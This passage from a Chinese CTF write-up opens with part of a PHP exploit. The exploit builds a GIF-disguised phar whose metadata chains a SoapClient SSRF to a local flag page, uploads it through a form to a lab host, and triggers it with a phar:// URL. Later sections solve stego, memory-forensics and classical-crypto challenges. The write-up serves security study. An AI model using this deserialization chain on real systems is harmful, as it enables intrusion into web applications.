invoke__\">system</span>(<span class=\"string\">&quot;calc&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;conn-&gt;<span class=\"title function_ invoke__\">clase</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$soap</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">SoapClient</span>(<span class=\"literal\">null</span>,<span class=\"keyword\">array</span>(<span class=\"string\">&quot;location&quot;</span>=&gt;<span class=\"string\">&quot;http://127.0.0.1/flag.php&quot;</span>,<span class=\"string\">&quot;uri&quot;</span>=&gt;<span class=\"string\">&quot;http://127.0.0.1/flag.php&quot;</span>));</span><br><span class=\"line\"><span class=\"variable\">$mysql</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Mysql</span>(</span><br><span class=\"line\">    <span class=\"variable\">$soap</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;xxx&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;xxx&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;xxx&quot;</span>,</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$ser</span>=<span class=\"variable\">$mysql</span>;</span><br><span class=\"line\">@<span class=\"title function_ invoke__\">unlink</span>(<span class=\"string\">&quot;phar.gif&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&quot;phar.phar&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">TAR</span>,<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">GZ</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$ser</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;f1ag.txt&quot;</span>,<span class=\"string\">&quot;f1ag&#123;PharData&#125;&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\">@<span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&quot;move phar.phar.tar.gz phar.gif&quot;</span>);</span><br><span class=\"line\">@<span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&quot;ls|findstr phar&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;phar://./phar.gif/f1ag.txt&quot;</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>运行上面脚本可以获得 <code>phar.gif</code>  并且输出里面的数据，然后可以看到生成的 phar.gif 并没有正则匹配的数据段</p>\n<p>再写一个 form 表单向题目上传文件:</p>\n<p><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://192.168.166.147:58003/upload.php&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;name&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;post&quot;</span> <span class=\"attr\">enctype</span>=<span class=\"string\">&quot;multipart/form-data&quot;</span> <span class=\"attr\">target</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span></span><br><span class=\"line\">    file:<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;file&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;file&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;提交&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/928bc6b5a4b37ece34945ec48f050563.png\" alt=\"image-20220619202551241\" /></p>\n<p>上传文件后自动跳转到题目的 <code>/upload.php</code>  下面，得到文件上传地址</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/8604d2a808d2a95033b7e47354f02a32.png\" alt=\"image-20220619202710848\" /></p>\n<p>然后使用 phar 协议加载这个文件地址即可触发反序列化</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTY2LjE0Nzo1ODAwMy91cGxvYWQucGhwP2ltZz1waGFyOi8vLi9zdG9yYWdlL2FlMDhhNjNmLmdpZg==\">http://192.168.166.147:58003/upload.php?img=phar://./storage/ae08a63f.gif</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/857640a3f076370e147a02fa7830303b.png\" alt=\"image-20220619203123372\" /></p>\n<p>最终会因为反序列化调用 <code>SoapClient</code>  访问 /flag.php 而将 flag 写入 flag.txt, 但是因为我们的文件格式并不是 gif 所以并不会满足 if 条件而输出 <code>go away hacker</code>  但是问题不大，此时去访问 flag.txt 即可得到 flag</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTY2LjE0Nzo1ODAwMy9mbGFnLnR4dA==\">http://192.168.166.147:58003/flag.txt</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/111191a5c9016190e8b5bcab43d52be6.png\" alt=\"image-20220619203336153\" /></p>\n<h2 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h2>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"pika\"><a class=\"anchor\" href=\"#pika\">#</a> pika</h3>\n<p><code>flag</code> ：flag{d6246d1f41fad032ee30193f3af15408}<br />\n lsb 隐写，RGB0 通道有异常，导出为一个 txt 文件。<br />\n内容如下：</p>\n<blockquote>\n<p>cGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYSBwaXBpIHBpIHBpcGkgcGkgcGkgcGkgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaXBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpY2h1IHBpY2h1IHBpY2h1IHBpY2h1IGthIGNodSBwaXBpIHBpcGkgcGlwaSBwaXBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIHBpa2FjaHUga2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaWthY2h1IHBpIHBpIHBpa2FjaHUgcGlwaSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIHBpa2FjaHUgcGlwaSBwaSBwaSBwaWthY2h1IHBpY2h1IHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaSBwaWthY2h1IHBpY2h1IGthIHBpa2FjaHUgcGkgcGkgcGkgcGlrYWNodSBrYSBwaWthY2h1IHBpcGkgcGkgcGlrYWNodSBwaWthY2h1IHBpY2h1IHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpIHBpa2FjaHUgcGljaHUgcGlrYWNodSBwaXBpIGthIGthIGthIGthIGthIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBwaWNodSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpa2FjaHUga2EgcGlrYWNodSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaWthY2h1IA==</p>\n</blockquote>\n<p>base64 解密，得到：</p>\n<blockquote>\n<p>pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pikachu pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pichu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka pikachu pi pi pikachu pi pi pikachu pipi pikachu pichu ka ka ka ka ka pikachu pipi pi pi pikachu pichu pi pi pi pikachu ka ka ka pikachu pipi pikachu ka ka ka ka ka pikachu pi pi pi pikachu pichu ka pikachu pi pi pi pikachu ka pikachu pipi pi pikachu pikachu pichu pi pikachu ka ka ka pikachu pi pikachu pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka pikachu pipi pi pikachu pichu pikachu pipi ka ka ka ka ka pikachu pi pi pi pi pi pikachu pichu ka ka pikachu pi pi pi pi pikachu ka pikachu ka ka ka ka pikachu pi pi pi pi pi pi pi pi pikachu pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu</p>\n</blockquote>\n<p>pikalang 解密网站：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGNvZGUuZnIvcGlrYWxhbmctbGFuZ3VhZ2U=\">https://www.dcode.fr/pikalang-language</span><br />\n 解密得 flag</p>\n<h3 id=\"内存中的secret\"><a class=\"anchor\" href=\"#内存中的secret\">#</a> 内存中的 secret</h3>\n<p>拿到两个文件， <code>secret.raw</code>  和  <code>yuijm0-=pkl;</code></p>\n<p>用 volatility 扫描 <code>secret.raw</code> ： <code>volatility -f secret.raw imageinfo</code> ，得到：</p>\n<blockquote>\n<p>Suggested Profile(s) : Win10x64_14393, Win10x64_10586, Win10x64, Win2016x64_14393</p>\n</blockquote>\n<p>是一个内存镜像文件，同时获得内存的操作系统类型及版本</p>\n<p>使用 AXIOM 分析内存镜像文件，镜像配置文件直接选择  <code>Win10x64_14393</code> ：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445061/Typera/2023/04/e34c8c2bc8f3779902c6fc3ef8d6d26f.png\" alt=\"image-20230426015056726\" /></p>\n<p>AXIOM 分析完毕后，先好好地翻一翻，看看都有啥。<br />\n使用痕迹 --&gt; 操作系统 --&gt; Windows 时间线活动，能找到不少 VeraCrypt 的运行痕迹：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445044/Typera/2023/04/3c5e8d2335b4749ed416a8374458b0d1.png\" alt=\"image-20230426015040521\" /></p>\n<p>使用痕迹 --&gt; web 相关，对日期做降序排序之后，能看到不少文件记录，<br />\n值得注意的有：几个虚拟磁盘文件，很可疑的 flag.txt.txt，BitLocker 恢复密钥，decrypt.png，secret.zip<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445040/Typera/2023/04/858e96afc434419d85425864be03a11b.png\" alt=\"image-20230426015035954\" /><br />\n 使用痕迹 --&gt; 加密，能看到 5 个 BitLocker 恢复密钥文件，其中四个恢复密钥部分内容完整，且包含有三个不同的恢复密钥，如下：<br />\n <code>109703-115929-085558-382888-715638-661716-466774-220858</code> <br />\n <code>172612-531773-032945-133364-584639-681373-481602-511291</code> <br />\n <code>109703-115929-085558-382888-715638-661716-466774-233200</code></p>\n<p>结合 VeraCrypt 的运行痕迹，猜测 <code>yuijm0-=pkl;</code>  应该是一个磁盘文件，大概需要使用 VeraCrypt 进行挂载，<br />\nweb 相关中得到的几个可以文件，应该与挂载之后的步骤有关联，<br />\n几个 BitLocker 恢复密钥，应该是需要我们使用恢复密钥，解开后面得到的某个文件。</p>\n<p>结合所给的提示：键盘密码，发现该文件的文件名很有特点，其轨迹如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445035/Typera/2023/04/e5efed00ab6006e2ec2efbfeb24d0dbf.png\" alt=\"image-20230426015029743\" /></p>\n<p>可以看出，应该是 TZ，推测挂载需使用的密码应该就是这个。<br />\n成功将磁盘文件挂载到本地后，得到一个虚拟磁盘文件： <code>encrypt.vhd</code></p>\n<p>打开 DiskGenius，磁盘 --&gt; 打开虚拟磁盘文件，选择上一步得到的文件，<br />\n是使用 BitLocker 加密的：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445028/Typera/2023/04/f84d4415570a55914af21382e4c88d08.png\" alt=\"image-20230426015024693\" /></p>\n<p>依次尝试之前获得的三个恢复密钥，可以成功解开，获得  <code>decrypt.png</code>  和 <code>secret.zip</code> ：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445027/Typera/2023/04/6a6c5ab814e6d331f41a18998a8a6ff8.png\" alt=\"image-20230426015019970\" /></p>\n<p>其中， <code>secret.zip</code>  被加密，结合文件名推测 <code>decrypt,png</code>  应该包含密码。<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445026/Typera/2023/04/70720bc6a39d9eab22e5f340a1829e4c.png\" alt=\"image-20230426015015401\" /></p>\n<p>文字提示：致敬 babydisk，可以联想到初赛的那道题，查看 wp 后获得关键词<strong>螺旋</strong>。<br />\n尝试后得到密码为：从右上角开始，按顺时针旋转的顺序列出偏旁： <code>⼃⼇⼋⼏⼎⼍⼌⼈⼄⼀⼁⼂⼆⼊⼉⼅</code> <br />\n直接复制维基的 Unicode，使用 7z 解才成功<br />\n（必须注意字符的问题，手打出来的偏旁，可能因为输入法的原因，无论如何也解不出来）</p>\n<p>解得 flag.txt 内容如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445014/Typera/2023/04/3a481abbd31dbb4dba5468a45f209de5.png\" alt=\"image-20230426015010492\" /></p>\n<p>用脚本解密：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">base64stego_decrypt</span>(<span class=\"params\">lines</span>):</span><br><span class=\"line\">    base64char = <span class=\"string\">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>     </span><br><span class=\"line\">    bintext = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> lines:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> line.find(<span class=\"string\">&quot;==&quot;</span>) &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">            tmp = <span class=\"built_in\">bin</span>(base64char.find(line[-<span class=\"number\">3</span>]) &amp; <span class=\"number\">15</span>)[<span class=\"number\">2</span>:]</span><br><span class=\"line\">            bintext = bintext+<span class=\"string\">&quot;0&quot;</span>*(<span class=\"number\">4</span>-<span class=\"built_in\">len</span>(tmp))+tmp</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> line.find(<span class=\"string\">&quot;=&quot;</span>) &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">            tmp = <span class=\"built_in\">bin</span>(base64char.find(line[-<span class=\"number\">2</span>]) &amp; <span class=\"number\">3</span>)[<span class=\"number\">2</span>:]</span><br><span class=\"line\">            bintext = bintext+<span class=\"string\">&quot;0&quot;</span>*(<span class=\"number\">2</span>-<span class=\"built_in\">len</span>(tmp))+tmp</span><br><span class=\"line\">    text = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">len</span>(bintext) % <span class=\"number\">8</span> != <span class=\"number\">0</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;error&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(bintext), <span class=\"number\">8</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(i+<span class=\"number\">8</span> &gt; <span class=\"built_in\">len</span>(bintext)):</span><br><span class=\"line\">                text = text+<span class=\"string\">&quot;-&quot;</span>+bintext[i:]</span><br><span class=\"line\">                <span class=\"keyword\">return</span> text</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                text = text+<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(bintext[i:i+<span class=\"number\">8</span>], <span class=\"number\">2</span>))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(bintext), <span class=\"number\">8</span>):</span><br><span class=\"line\">            text = text+<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(bintext[i:i+<span class=\"number\">8</span>], <span class=\"number\">2</span>))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> text</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    path = <span class=\"string\">&quot;flag.txt&quot;</span></span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(path, <span class=\"string\">&quot;r&quot;</span>)</span><br><span class=\"line\">    line = file.read().splitlines()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(base64stego_decrypt(line))</span><br></pre></td></tr></table></figure><br />\n 得到 flag： <code>MemoRy_S1cr1t</code></p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> CRYPTO</h2>\n<h3 id=\"eazy\"><a class=\"anchor\" href=\"#eazy\">#</a> eazy</h3>\n<p a9462922e5da8ef93d213c33168881c5=\"\"><code>flag</code> : flag</p>\n<p>打开后得到 base64，解密得到：<br />\nsvciqytf10r3ln!nule7<br />\nW 形栅栏解密，栏数为 3，得到：<br />\nsyntvfu1c0lri3elqn7!<br />\n 凯撒直接遍历，<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">model = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class=\"line\">model2 = <span class=\"string\">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">str1 = <span class=\"string\">&quot;syntvfu1c0lri3elqn7!&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> key <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">27</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> str1:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> s.islower():</span><br><span class=\"line\">            n = model.find(s)</span><br><span class=\"line\">            s = model[n-key]</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> s.isupper():</span><br><span class=\"line\">            n = model2.find(s)</span><br><span class=\"line\">            s = model2[n-key]</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(s, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><br />\n 得到：<br />\nflagish1p0yev3ryda7!，<br />\n就是：flag is h1p0yev3ryda7!<br />\n 然后 h1p0yev3ryda7! 进行 md5 32 (小写) 加密，得到 flag</p>\n<h3 id=\"runfaster\"><a class=\"anchor\" href=\"#runfaster\">#</a> RunFaster</h3>\n<p 0ed7bc5c61e32c10e082abd2b5589a22=\"\"><code>flag</code> : flag</p>\n<p>下载题目后查看 ciphertext.txt，发下里面是整齐的 16 进制串，题目无其他提示，转成字符后无实意。不过之前比赛遇到过类似的题目，是 OTP 一次密码，这样确实也符合题目 RunFaster，参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVhbngubmV0L21hbnktdGltZS1wYWQv\"> Many-Time-Pad 攻击</span>，修改脚本逆求 key。</p>\n<p>MTP 脚本如下</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> Crypto.Util.strxor <span class=\"keyword\">as</span> xo</span><br><span class=\"line\"><span class=\"keyword\">import</span> libnum, codecs, numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">isChr</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>) &lt;= x <span class=\"keyword\">and</span> x &lt;= <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;z&#x27;</span>): <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>) &lt;= x <span class=\"keyword\">and</span> x &lt;= <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;Z&#x27;</span>): <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">infer</span>(<span class=\"params\">index, pos</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> msg[index, pos] != <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    msg[index, pos] = <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(c)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> x != index:</span><br><span class=\"line\">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">dat = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getSpace</span>():</span><br><span class=\"line\">    <span class=\"keyword\">for</span> index, x <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(c):</span><br><span class=\"line\">        res = [xo.strxor(x, y) <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> c <span class=\"keyword\">if</span> x!=y]</span><br><span class=\"line\">        f = <span class=\"keyword\">lambda</span> pos: <span class=\"built_in\">len</span>(<span class=\"built_in\">list</span>(<span class=\"built_in\">filter</span>(isChr, [s[pos] <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> res])))</span><br><span class=\"line\">        cnt = [f(pos) <span class=\"keyword\">for</span> pos <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(x))]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> pos <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(x)):</span><br><span class=\"line\">            dat.append((f(pos), index, pos))</span><br><span class=\"line\"></span><br><span class=\"line\">c = [codecs.decode(x.strip().encode(), <span class=\"string\">&#x27;hex&#x27;</span>) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;Problem.txt&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>).readlines()]</span><br><span class=\"line\"></span><br><span class=\"line\">msg = np.zeros([<span class=\"built_in\">len</span>(c), <span class=\"built_in\">len</span>(c[<span class=\"number\">0</span>])], dtype=<span class=\"built_in\">int</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">getSpace()</span><br><span class=\"line\"></span><br><span class=\"line\">dat = <span class=\"built_in\">sorted</span>(dat)[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> w, index, pos <span class=\"keyword\">in</span> dat:</span><br><span class=\"line\">    infer(index, pos)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\n&#x27;</span>.join([<span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">chr</span>(c) <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> x]) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> msg]))</span><br></pre></td></tr></table></figure></p>\n<p>得到对应输出</p>\n<p><img 